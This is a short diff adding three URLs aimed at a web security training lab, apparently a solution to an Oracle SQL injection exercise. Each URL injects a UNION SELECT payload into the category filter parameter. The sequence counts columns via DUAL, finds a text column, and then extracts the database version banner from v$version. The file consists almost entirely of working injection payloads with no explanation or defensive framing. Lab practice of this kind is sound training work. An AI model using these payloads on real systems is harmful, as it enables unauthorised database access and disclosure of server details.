@@ -1,0 +1,5 @@
+https://ac4c1fe51f6ef27980af78950073000e.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,NULL FROM DUAL--
+
+https://ac4c1fe51f6ef27980af78950073000e.web-security-academy.net/filter?category=Gifts' UNION SELECT 'a',NULL FROM DUAL--
+
+https://ac4c1fe51f6ef27980af78950073000e.web-security-academy.net/filter?category=Gifts' UNION SELECT BANNER,NULL FROM v$version--
